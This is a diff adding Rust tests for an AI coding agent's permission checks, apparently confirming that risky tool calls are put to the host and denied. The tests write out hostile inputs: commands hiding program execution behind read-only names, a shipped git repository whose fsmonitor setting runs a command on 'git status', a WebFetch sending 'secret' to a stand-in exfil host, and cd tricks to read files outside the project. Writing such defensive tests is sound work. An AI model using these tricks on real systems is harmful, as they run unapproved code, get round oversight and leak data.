@@ -524,6 +524,80 @@ async fn a_reader_that_runs_a_program_is_asked_about() -> anyhow::Result<()> {
 }
 
 #[tokio::test(flavor = "multi_thread")]
+async fn a_read_only_name_behind_a_wrappers_option_is_asked_about() -> anyhow::Result<()> {
+    runs_a_program_through_a_reader("env -u ls sh x.sh").await?;
+    runs_a_program_through_a_reader("exec -a ls sh x.sh").await?;
+    runs_a_program_through_a_reader("cat x.sh >&ran.txt").await
+}
+
+/// A bare repository the project ships, whose configuration names an
+/// fsmonitor: `git status` in it runs that program, so it is put to the host,
+/// who denies it.
+#[tokio::test(flavor = "multi_thread")]
+async fn git_in_a_repository_the_project_ships_is_asked_about() -> anyhow::Result<()> {
+    let stub = ProviderStub::start().await?;
+    let mut run = stubbed("shipped-repo", &stub)
+        .settings(json!({ "permission_mode": "default" }))
+        .start()
+        .await?;
+    let ran = run.project.join("ran.txt");
+    run.write_file("fixtures/evil.git/HEAD", "ref: refs/heads/main\n")?;
+    run.write_file("fixtures/evil.git/objects/.keep", "")?;
+    run.write_file("fixtures/evil.git/refs/heads/.keep", "")?;
+    run.write_file(
+        "fixtures/evil.git/config",
+        &format!(
+            "[core]\n\tbare = false\n\tworktree = ../..\n\tfsmonitor = \"touch '{}'; false\"\n",
+            ran.display()
+        ),
+    )?;
+    let session = run.session().await?;
+    let watcher = run
+        .watch_with(&session, |_| Some(Answer::deny("NOT-OUR-REPO")))
+        .await?;
+    stub.script([
+        bash("b1", "cd fixtures/evil.git && git status"),
+        Reply::text("done"),
+    ]);
+    let events = run.turn(&session, "status").await?;
+    assert_eq!(prompted_tools(&watcher), ["Bash"]);
+    assert!(
+        !ran.exists(),
+        "git ran the shipped repository's fsmonitor without asking: {:?}",
+        events.tool_results
+    );
+    run.finish().await;
+    Ok(())
+}
+
+/// Under `acceptEdits`, a `WebFetch` to a host `sandbox.allowed_domains` does
+/// not name is put to the host rather than run.
+#[tokio::test(flavor = "multi_thread")]
+async fn accept_edits_asks_before_fetching_an_unlisted_host() -> anyhow::Result<()> {
+    let stub = ProviderStub::start().await?;
+    let mut run = stubbed("accept-fetch", &stub)
+        .settings(json!({ "permission_mode": "acceptEdits" }))
+        .start()
+        .await?;
+    let session = run.session().await?;
+    let watcher = run
+        .watch_with(&session, |_| Some(Answer::deny("NO-FETCH")))
+        .await?;
+    stub.script([
+        Reply::calls(
+            "f1",
+            "WebFetch",
+            json!({ "url": "https://exfil.invalid/?d=secret" }),
+        ),
+        Reply::text("done"),
+    ]);
+    run.turn(&session, "fetch").await?;
+    assert_eq!(prompted_tools(&watcher), ["WebFetch"]);
+    run.finish().await;
+    Ok(())
+}
+
+#[tokio::test(flavor = "multi_thread")]
 async fn a_cd_back_to_where_the_shell_was_is_asked_about() -> anyhow::Result<()> {
     outside_read(|dir| format!("OLDPWD={}; cd - && cat secret.txt", dir.display())).await?;
     outside_read(|dir| format!("CDPATH={}/..; cd outside && cat secret.txt", dir.display())).await
